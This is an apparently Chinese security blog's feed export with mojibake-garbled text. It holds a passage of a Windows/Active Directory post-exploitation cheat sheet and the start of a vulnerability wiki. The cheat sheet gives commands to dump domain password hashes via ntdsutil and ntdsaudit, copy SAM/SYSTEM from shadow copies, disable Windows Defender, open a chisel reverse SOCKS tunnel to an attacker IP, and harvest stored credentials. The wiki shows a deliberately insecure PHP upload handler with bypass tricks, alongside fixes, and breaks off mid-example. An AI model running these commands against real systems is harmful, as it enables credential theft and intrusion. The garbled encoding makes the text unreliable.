æ³•ç®€å•åœ°å¤åˆ¶å’Œç²˜è´´ã€‚ä»åŸŸæ§åˆ¶å™¨è·å–è¿™äº›æ–‡ä»¶çš„æ¨èæ–¹æ³•æ˜¯ä½¿ç”¨å†…ç½®<code>ntdsutil</code>å®ç”¨ç¨‹åºã€‚</p><ul><li>ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼ˆ<code>cmd.exe</code>ï¼‰ã€‚è¦ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼Œè¯·å•å‡»â€œå¯åŠ¨â€ã€‚åœ¨â€œå¼€å§‹æœç´¢â€ä¸­ï¼Œé”®å…¥å‘½ä»¤æç¤ºç¬¦ã€‚åœ¨â€œå¼€å§‹â€èœå•çš„é¡¶éƒ¨ï¼Œå³é”®å•å‡»â€œå‘½ä»¤æç¤ºç¬¦â€ï¼Œç„¶åå•å‡»â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€ã€‚å¦‚æœå‡ºç°â€œç”¨æˆ·å¸æˆ·æ§åˆ¶â€å¯¹è¯æ¡†ï¼Œè¯·è¾“å…¥ç›¸åº”çš„å‡­æ®ï¼ˆå¦‚æœå·²è¯·æ±‚ï¼‰å¹¶ç¡®è®¤å…¶æ˜¾ç¤ºçš„æ“ä½œæ˜¯æ‚¨æ‰€éœ€çš„æ“ä½œï¼Œç„¶åå•å‡»â€œç»§ç»­â€ã€‚</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åæŒ‰ENTERé”®ï¼š</span></span><br><span class="line">ntdsutil</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨ntdsutilæç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åæŒ‰Enterï¼š</span></span><br><span class="line">activate instance ntds</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨ntdsutilæç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åæŒ‰Enterï¼š</span></span><br><span class="line">ifm</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨ifmæç¤ºç¬¦ä¸‹ï¼Œé”®å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åæŒ‰Enterï¼š</span></span><br><span class="line">create full &lt;Drive&gt;:\&lt;Folder&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;Drive&gt;:\&lt;Folder&gt; æ˜¯è¦åˆ›å»ºçš„æ–‡ä»¶çš„æ–‡ä»¶å¤¹è·¯å¾„ã€‚</span></span><br></pre></td></tr></table></figure><p>  ä¾‹å¦‚ï¼Œä»¥ä¸‹å‘½ä»¤å°†æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯ï¼Œè¾“å‡º<code>pwdump.txt</code>åŒ…å«å¯†ç å“ˆå¸Œå€¼çš„æ–‡ä»¶ï¼Œå¹¶è¾“å‡º<code>users.csv</code>åŒ…å«æ¯ä¸ªç”¨æˆ·å¸æˆ·è¯¦ç»†ä¿¡æ¯çš„æ–‡ä»¶ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv</span><br></pre></td></tr></table></figure><h4 id="Linux-æ˜æ–‡å¯†ç çš„è·å–"><a href="#Linux-æ˜æ–‡å¯†ç çš„è·å–" class="headerlink" title="Linux æ˜æ–‡å¯†ç çš„è·å–"></a>Linux æ˜æ–‡å¯†ç çš„è·å–</h4><p>mimipenguin</p><p>git clone <a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">https://github.com/huntergregal/mimipenguin</a></p><p>æ”¯æŒçš„æ“ä½œç³»ç»Ÿ</p><table><thead><tr><th style="text-align:left">os</th><th style="text-align:left">service</th><th style="text-align:left">supported</th></tr></thead><tbody><tr><td style="text-align:left">Ubuntu Desktop 12.04 LTS x64</td><td style="text-align:left">gnome-keyring-daemon (3.18.3)</td><td style="text-align:left">Y</td></tr><tr><td style="text-align:left">Ubuntu Desktop 16.04 LTS x64</td><td style="text-align:left">gnome-keyring-daemon (3.18.3)</td><td style="text-align:left">Y</td></tr><tr><td style="text-align:left">Fedora Workstation 25 (x86_64)</td><td style="text-align:left">gnome-keyring-daemon (3.20.0)</td><td style="text-align:left">Y</td></tr><tr><td style="text-align:left">Fedora Workstation 27 (x86_64)</td><td style="text-align:left">gnome-keyring-daemon (3.20.1)</td><td style="text-align:left">Y</td></tr><tr><td style="text-align:left">Kali-rolling x64</td><td style="text-align:left">gnome-keyring-daemon (3.28.0.2)</td><td style="text-align:left">Y</td></tr></tbody></table><h4 id="ä»å·å½±å‰¯æœ¬ä¸­è½¬å‚¨å¿«ç…§"><a href="#ä»å·å½±å‰¯æœ¬ä¸­è½¬å‚¨å¿«ç…§" class="headerlink" title="ä»å·å½±å‰¯æœ¬ä¸­è½¬å‚¨å¿«ç…§"></a>ä»å·å½±å‰¯æœ¬ä¸­è½¬å‚¨å¿«ç…§</h4><p>æˆ‘ä»¬è¿˜å¯ä»¥åˆ›å»º<code>SAM</code>å’Œ<code>SYSTEM</code>æ–‡ä»¶çš„â€œå·å½±å‰¯æœ¬â€ ï¼ˆå®ƒä»¬å§‹ç»ˆé”å®šåœ¨å½“å‰ç³»ç»Ÿä¸Šï¼‰ï¼Œå› æ­¤æˆ‘ä»¬ä»ç„¶å¯ä»¥å°†å®ƒä»¬å¤åˆ¶åˆ°æœ¬åœ°ç³»ç»Ÿä¸­ã€‚ä¸ºæ­¤éœ€è¦æå‡çš„æç¤º</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic shadowcopy call create Volume=<span class="string">'C:\'</span></span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system</span><br></pre></td></tr></table></figure><h3 id="å…³é—­Windows-Defender"><a href="#å…³é—­Windows-Defender" class="headerlink" title="å…³é—­Windows Defender"></a>å…³é—­Windows Defender</h3><p>ğŸ‘€ğŸš©</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-MpPreference -DisableRealtimeMonitoring <span class="literal">$true</span></span><br><span class="line"></span><br><span class="line">Set-MpPreference -DisableIOAVProtection <span class="literal">$true</span></span><br></pre></td></tr></table></figure><p>æˆ–å°†Defenderä¿æŒå¯ç”¨çŠ¶æ€ï¼Œç„¶åä»å…¶ä¸­åˆ é™¤ç­¾åã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"C:\Program Files\Windows Defender\MpCmdRun.exe"</span> -RemoveDefinitions -All</span><br></pre></td></tr></table></figure><h3 id="Chisel-ä»£ç†"><a href="#Chisel-ä»£ç†" class="headerlink" title="Chisel ä»£ç†"></a>Chisel ä»£ç†</h3><p>è¿™æ˜¯ä¸€ä¸ªæœ‰å…³å¦‚ä½•è®¾ç½®Socksä»£ç†ä»¥åœ¨å—æ„ŸæŸ“ä¸»æœºä¸Šè¿›è¡Œå‡¿å‡¿çš„ç¤ºä¾‹ã€‚å‡¿å­è¿˜å¯ä»¥åšæ›´å¤šçš„äº‹æƒ…ï¼</p><p>åœ¨æ”»å‡»è€…æœºå™¨ï¼ˆLinuxæˆ–Windowsï¼‰ä¸Šï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 8888 --reverse</span><br></pre></td></tr></table></figure><p>ç›®æ ‡æ‰§è¡Œï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\chisel_windows_386.exe client <span class="number">10.10</span>.<span class="number">16.7</span>:<span class="number">8888</span> R:<span class="number">8001</span>:<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9001</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬æ­£åœ¨ä¾¦å¬<code>localhost:8001</code>æ”»å‡»æœºï¼Œä»¥å°†æµé‡è½¬å‘ç»™<code>target:9001</code>ã€‚</p><p>ç„¶åï¼Œæ‰“å¼€SocksæœåŠ¡å™¨ã€‚ä¼°è®¡çš„æ­£å¥½ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\chisel_windows_386.exe server -p <span class="number">9001</span> --socks5</span><br></pre></td></tr></table></figure><p>åœ¨æ”»å‡»æœºä¸Šï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client localhost:8001 socks</span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œåœ¨æ”»å‡»è®¡ç®—æœºçš„ç«¯å£1080ä¸Šæ‰“å¼€äº†ä¸€ä¸ªä»£ç†ã€‚</p><h3 id="Juicy-files"><a href="#Juicy-files" class="headerlink" title="Juicy files"></a>Juicy files</h3><p>æœ‰å¾ˆå¤šæ–‡ä»¶å¯èƒ½åŒ…å«æœ‰è¶£çš„ä¿¡æ¯ã€‚<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" target="_blank" rel="noopener">WinPEAS</a>ç±»çš„å·¥å…·æˆ–<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" target="_blank" rel="noopener">PowerSploit</a>ç±»çš„<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">é›†åˆ</a>å¯èƒ½æœ‰åŠ©äºè¯†åˆ«å¤šæ±çš„æ–‡ä»¶ï¼ˆç”¨äºprivescæˆ–post-exploitationï¼‰ã€‚</p><p>ä»¥ä¸‹æ˜¯æˆ‘é‡åˆ°è¿‡çš„ä¸€äº›ç›¸å…³æ–‡ä»¶çš„åˆ—è¡¨ã€‚æ ¹æ®è®¡ç®—æœºä¸Šå®‰è£…çš„ç¨‹åºå’Œ/æˆ–æœåŠ¡æ£€æŸ¥æ–‡ä»¶ã€‚</p><blockquote><p>æ­¤å¤–ï¼Œä¸è¦å¿˜è®°ä½¿ç”¨<code>sqlcmd</code>æˆ–æšä¸¾ä»»ä½•æœ¬åœ°æ•°æ®åº“<code>Invoke-SqlCmd</code>ã€‚</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰€æœ‰ç”¨æˆ·æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="comment">## å¦‚æœæ–‡ä»¶å¤ªå¤šï¼Œè¯·é™åˆ¶æ­¤å‘½ä»¤;ï¼‰</span></span><br><span class="line">tree /f /a C:\Users</span><br><span class="line"></span><br><span class="line"><span class="comment"># Web.config</span></span><br><span class="line">C:\inetpub\www\*\web.config</span><br><span class="line"></span><br><span class="line"><span class="comment"># Unattend æ–‡ä»¶</span></span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># RDP é…ç½®æ–‡ä»¶</span></span><br><span class="line">C:\ProgramData\Configs\</span><br><span class="line"></span><br><span class="line"><span class="comment"># Powershell scripts/config æ–‡ä»¶</span></span><br><span class="line">C:\Program Files\Windows PowerShell\</span><br><span class="line"></span><br><span class="line"><span class="comment"># PuTTy é…ç½®æ–‡ä»¶</span></span><br><span class="line">C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty</span><br><span class="line"></span><br><span class="line"><span class="comment"># FileZilla è¯ä¹¦</span></span><br><span class="line">C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># Jenkins creds (also check out the Windows vault, see above)</span></span><br><span class="line">C:\Program Files\Jenkins\credentials.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># WLAN profiles</span></span><br><span class="line">C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># TightVNC å¯†ç  (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)</span></span><br><span class="line"><span class="built_in">Get-ItemProperty</span> -Path HKLM:\Software\TightVNC\Server -Name <span class="string">"Password"</span> | select -ExpandProperty Password</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Windowså’ŒActive-Directoryå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒ&quot;&gt;&lt;a href=&quot;#Windowså’ŒActive-Directoryå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒ&quot; class=&quot;headerlink&quot; title=&quot;Windowså’ŒActive Directoryå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒ&quot;&gt;&lt;/a&gt;Windowså’ŒActive Directoryå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒ&lt;/h1&gt;&lt;h2 id=&quot;General&quot;&gt;&lt;a href=&quot;#General&quot; class=&quot;headerlink&quot; title=&quot;General&quot;&gt;&lt;/a&gt;General&lt;/h2&gt;&lt;h3 id=&quot;PowerShell-AMSI-Bypass&quot;&gt;&lt;a href=&quot;#PowerShell-AMSI-Bypass&quot; class=&quot;headerlink&quot; title=&quot;PowerShell AMSI Bypass&quot;&gt;&lt;/a&gt;PowerShell AMSI Bypass&lt;/h3&gt;&lt;p&gt;ä¿®è¡¥AMSIå°†æœ‰åŠ©äºç»•è¿‡æ‰§è¡Œæ ‡è®°ä¸ºæ¶æ„çš„&lt;code&gt;PowerShell&lt;/code&gt;è„šæœ¬ï¼ˆä¾‹å¦‚&lt;code&gt;PowerView&lt;/code&gt;ï¼‰æ—¶è§¦å‘çš„AVè­¦å‘Šã€‚è¯·å‹¿åœ¨ç§˜å¯†æ“ä½œä¸­æŒ‰åŸæ ·ä½¿ç”¨ï¼Œå› ä¸ºå®ƒä»¬ä¼šè¢«æ ‡è®°&lt;code&gt;flag&lt;/code&gt;ã€‚é€šè¿‡æ›´æ”¹è„šæœ¬ä»¥èƒœè¿‡åŸºäºç­¾åçš„æ£€æµ‹ï¼Œå¯ä»¥æ··æ·†ç”šè‡³æ›´å¥½åœ°å®Œå…¨æ¶ˆé™¤AMSIç»•è¿‡çš„éœ€è¦ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="å¤‡å¿˜å½•" scheme="https://yaalonsong.github.io/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="åŸŸ" scheme="https://yaalonsong.github.io/tags/%E5%9F%9F/"/>
    
      <category term="å¤‡å¿˜å½•" scheme="https://yaalonsong.github.io/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
      <category term="AD" scheme="https://yaalonsong.github.io/tags/AD/"/>
    
  </entry>
  
  <entry>
    <title>æ¼æ´å®‰å…¨çŸ¥è¯†Wiki</title>
    <link href="https://yaalonsong.github.io/2020/12/04/%E6%BC%8F%E6%B4%9E%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86Wiki.html"/>
    <id>https://yaalonsong.github.io/2020/12/04/æ¼æ´å®‰å…¨çŸ¥è¯†Wiki.html</id>
    <published>2020-12-04T07:02:28.000Z</published>
    <updated>2020-12-04T08:35:37.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¼æ´å®‰å…¨çŸ¥è¯†Wiki"><a href="#æ¼æ´å®‰å…¨çŸ¥è¯†Wiki" class="headerlink" title="æ¼æ´å®‰å…¨çŸ¥è¯†Wiki"></a>æ¼æ´å®‰å…¨çŸ¥è¯†Wiki</h1><blockquote><p>æœ¬æ–‡ä»æ¼æ´ç±»å‹çš„ç»´åº¦è¿›è¡ŒçŸ¥è¯†ä½“ç³»çš„æ•´ç†ï¼ŒåŒ…å«äº†æ¼æ´ä»‹ç»ã€æ¼æ´å±å®³ã€æ”»å‡»æ¡ˆä¾‹ã€æ£€æµ‹æ–¹æ³•ã€è§£å†³æ–¹æ¡ˆçš„å†…å®¹ï¼Œéƒ¨åˆ†æ¼æ´ç±»å‹ä»ä»£ç å±‚äº†è§£æ­¤ç±»æ¼æ´åŸç†åŠä¿®å¤æ–¹æ³•ã€‚æŒç»­æ›´æ–°ã€‚</p></blockquote><a id="more"></a><h3 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ </h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li>æ–‡ä»¶ä¸Šä¼ æ¼æ´é€šå¸¸ç”±äºç½‘é¡µä»£ç ä¸­çš„æ–‡ä»¶ä¸Šä¼ è·¯å¾„å˜é‡è¿‡æ»¤ä¸ä¸¥æˆ–<code>Webserver</code>ç›¸å…³è§£ææ¼æ´æœªä¿®å¤è€Œé€ æˆçš„ï¼Œå¦‚æœæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½å®ç°ä»£ç æ²¡æœ‰ä¸¥æ ¼é™åˆ¶ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶åç¼€ä»¥åŠæ–‡ä»¶ç±»å‹ï¼Œæ”»å‡»è€…å¯é€šè¿‡<code>Web</code> è®¿é—®çš„ç›®å½•ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼ŒåŒ…æ‹¬ç½‘ç«™åé—¨æ–‡ä»¶ï¼ˆ<code>Webshell</code>ï¼‰ï¼Œè¿›è€Œè¿œç¨‹æ§åˆ¶ç½‘ç«™æœåŠ¡å™¨ã€‚</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li>éæ³•ç”¨æˆ·å¯ä»¥åˆ©ç”¨ä¸Šä¼ çš„æ¶æ„è„šæœ¬æ–‡ä»¶æ§åˆ¶æ•´ä¸ªç½‘ç«™ï¼Œç”šè‡³æ§åˆ¶æœåŠ¡å™¨ã€‚è¿™ä¸ªæ¶æ„çš„è„šæœ¬æ–‡ä»¶ï¼Œåˆè¢«ç§°ä¸º<code>Webshell</code>ï¼Œä¹Ÿå¯å°†<code>Webshell</code>è„šæœ¬ç§°ä¸ºä¸€ç§ç½‘é¡µåé—¨ï¼Œ<code>Webshell</code>è„šæœ¬å…·æœ‰éå¸¸å¼ºå¤§çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æŸ¥çœ‹æœåŠ¡å™¨ç›®å½•ã€ã€‚æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ç­‰ã€‚ </li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰å›¾ç‰‡æ‰€åœ¨çš„ç›®æ ‡ä½ç½®</span></span><br><span class="line"><span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;  </span><br><span class="line"><span class="comment">// ä¸Šä¼ çš„æ–‡ä»¶å°†è¢«ä¿å­˜ã€‚</span></span><br><span class="line">$target = <span class="string">"pictures/"</span> . basename($_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="comment">// å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚</span></span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'tmp_name'</span>], $target))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"The picture has been successfully uploaded."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"There was an error uploading the picture, please try again."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><em>å¯¹åº”ç”¨å¹³å°çš„æ”»å‡»</em></strong></p><ul><li>å°†<code>.jsp</code>æ–‡ä»¶ä¸Šä¼ åˆ°<code>Web tree</code>â€”â€”ä»¥<code>Web</code>ç”¨æˆ·èº«ä»½æ‰§è¡Œçš„<code>JSP</code>ä»£ç </li><li>ä¸Šä¼ <code>.gif</code>æ–‡ä»¶ä»¥é‡æ–°è°ƒæ•´å¤§å°â€”â€”åˆ©ç”¨å›¾ç‰‡åº“æ¼æ´</li><li>ä¸Šä¼ å¤§æ–‡ä»¶â€”â€”æ–‡ä»¶ç©ºé—´æ‹’ç»æœåŠ¡</li><li>ä½¿ç”¨æ¶æ„è·¯å¾„æˆ–åç§°ä¸Šä¼ æ–‡ä»¶â€”â€”è¦†ç›–å…³é”®æ–‡ä»¶</li><li>ä¸Šè½½åŒ…å«ä¸ªäººæ•°æ®çš„æ–‡ä»¶â€”â€”å…¶ä»–ç”¨æˆ·å¯ä»¥è®¿é—®å®ƒ</li><li>ä¸Šè½½åŒ…å«â€œæ ‡ç­¾â€çš„æ–‡ä»¶â€”â€”æ ‡ç­¾è¢«æ‰§è¡Œä¸ºâ€œåŒ…å«â€åœ¨ç½‘é¡µä¸­çš„ä¸€éƒ¨åˆ†</li><li>ä¸Šè½½è¦ç”±é˜²ç—…æ¯’è½¯ä»¶æ‰«æçš„<code>.rar</code>æ–‡ä»¶â€”â€”åœ¨è¿è¡Œæ˜“å—æ”»å‡»çš„é˜²ç—…æ¯’è½¯ä»¶çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œçš„å‘½ä»¤</li></ul><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>æ£€æµ‹å‰ç«¯ä»£ç å¯ä»¥é€šè¿‡<code>JS</code>ç¦ç”¨ï¼Œå°è¯•ä¸Šä¼ å…¶ä»–åç¼€åæ ¼å¼çš„æ–‡ä»¶çœ‹æ˜¯å¦ä¸Šä¼ æˆåŠŸï¼›</p></li><li><p>æ£€æµ‹<code>content-type</code>ï¼Œé€šè¿‡ä¿®æ”¹<code>content-type</code>çš„æ–‡ä»¶ç±»å‹å°è¯•ä¸Šä¼ ç›®æ ‡æ ¼å¼æ–‡ä»¶ï¼›</p></li><li><p>æ£€æµ‹æ–‡ä»¶å¤´åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œé€šè¿‡ä½¿ç”¨å¸¸è§çš„æ–‡ä»¶å¤´çš„hexç¼–ç æ¥ç¡®è®¤æ–‡ä»¶ç±»å‹ï¼›</p></li><li><p>æ£€æµ‹ç›®æ ‡æ˜¯å¦å­˜åœ¨<code>IIS</code>è§£ææ¼æ´ï¼Œå‡è®¾ä¸Šä¼ ä¸€ä¸ªåä¸º<code>&quot;test.asp;xxx.jpg&quot;</code>æ—¶ï¼Œè¯¥æ–‡ä»¶ä¼šè¢«å½“åš<code>asp</code>æ–‡ä»¶è§£æï¼›</p></li><li><p>æ£€æµ‹ç›®æ ‡æ˜¯å¦æœ‰<code>Apache</code>è§£ææ¼æ´ï¼Œæ£€æµ‹ç›®æ ‡æ˜¯å¦å¯ä»¥ä½¿ç”¨<code>%00</code>æˆªæ–­ç­‰ï¼›</p></li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>å¯¹ä¸Šä¼ æ–‡ä»¶ç±»å‹è¿›è¡Œé™åˆ¶ï¼Œå¹¶ä¸”ä¸èƒ½åªåšå‰ç«¯çš„é™åˆ¶ï¼Œè€Œè¦å‰ç«¯å’Œåç«¯ä¸€èµ·é™åˆ¶ï¼Œåç«¯å¯ä»¥è¿›è¡Œæ‰©å±•åæ£€æµ‹ï¼Œé‡å‘½åæ–‡ä»¶ï¼ŒMIMEç±»å‹æ£€æµ‹ä»¥åŠé™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œæˆ–æ˜¯å°†ä¸Šä¼ çš„æ–‡ä»¶æ”¾åœ¨å®‰å…¨çš„è·¯å¾„ä¸‹ï¼Œå°½é‡æ”¾äºWeb serverä¹‹å¤–çš„è¿œç¨‹æœåŠ¡å™¨ç­‰ã€‚</p></li><li><p>ä¸¥æ ¼é™åˆ¶å’Œæ ¡éªŒä¸Šä¼ çš„æ–‡ä»¶ï¼Œç¦æ­¢ä¸Šä¼ æ¶æ„ä»£ç çš„æ–‡ä»¶ã€‚åŒæ—¶é™åˆ¶ç›¸å…³ç›®å½•çš„æ‰§è¡Œæƒé™ï¼Œé˜²èŒƒWebshellæ”»å‡»ã€‚</p></li><li><p>å¯¹ä¸Šä¼ æ–‡ä»¶æ ¼å¼è¿›è¡Œä¸¥æ ¼æ ¡éªŒåŠå®‰å…¨æ‰«æï¼Œé˜²æ­¢ä¸Šä¼ æ¶æ„è„šæœ¬æ–‡ä»¶ï¼›</p></li><li><p>è®¾ç½®æƒé™é™åˆ¶ï¼Œç¦æ­¢ä¸Šä¼ ç›®å½•çš„æ‰§è¡Œæƒé™ï¼›</p></li><li><p>ä¸¥æ ¼é™åˆ¶å¯ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ï¼›</p></li><li><p>ä¸¥æ ¼é™åˆ¶ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„ã€‚</p></li><li><p>æ–‡ä»¶æ‰©å±•åæœåŠ¡ç«¯ç™½åå•æ ¡éªŒã€‚</p></li><li><p>æ–‡ä»¶å†…å®¹æœåŠ¡ç«¯æ ¡éªŒã€‚</p></li><li><p>ä¸Šä¼ æ–‡ä»¶é‡å‘½åã€‚</p></li><li><p>éšè—ä¸Šä¼ æ–‡ä»¶è·¯å¾„ã€‚</p></li></ul><h3 id="ä»»æ„æ–‡ä»¶ä¸‹è½½"><a href="#ä»»æ„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸‹è½½"></a>ä»»æ„æ–‡ä»¶ä¸‹è½½</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li>æŸäº›ç½‘ç«™å¯èƒ½å› ä¸ºä¸šåŠ¡éœ€è¦ï¼Œæä¾›æ–‡ä»¶æŸ¥çœ‹æˆ–è€…ä¸‹è½½çš„åŠŸèƒ½ï¼Œå¦‚æœå¯¹ç”¨æˆ·æŸ¥çœ‹æˆ–è€…éœ€è¦ä¸‹è½½çš„æ–‡ä»¶ä¸åšé™åˆ¶ï¼Œé‚£ä¹ˆä¸€äº›æ”»å‡»è€…å¯èƒ½æ„é€ æ¶æ„ä»£ç ä¸‹è½½ç½‘ç«™çš„æ•æ„Ÿæ–‡ä»¶ï¼ˆæºä»£ç ï¼Œæ•°æ®åº“æ–‡ä»¶ï¼Œç™»å½•å¯†ç ç­‰ï¼‰ã€‚</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>å¯ä»¥ä¸‹è½½ç›®æ ‡æœåŠ¡å™¨çš„ä»»æ„æ–‡ä»¶ï¼Œå¦‚ç½‘ç«™æºç ã€ç½‘ç«™é…ç½®æ–‡ä»¶ã€ç³»ç»Ÿé…ç½®æ–‡ä»¶ç­‰ã€‚</p></li><li><p>é€šè¿‡è·å–çš„æºç è¿›è¡Œä»£ç å®¡è®¡ï¼Œè¿›ä¸€æ­¥è·å¾—å¯åˆ©ç”¨çš„æ¼æ´ã€‚</p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šç”¨<code>header()</code>ä¸‹è½½ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = <span class="string">"uploads/abc.jpg"</span>;</span><br><span 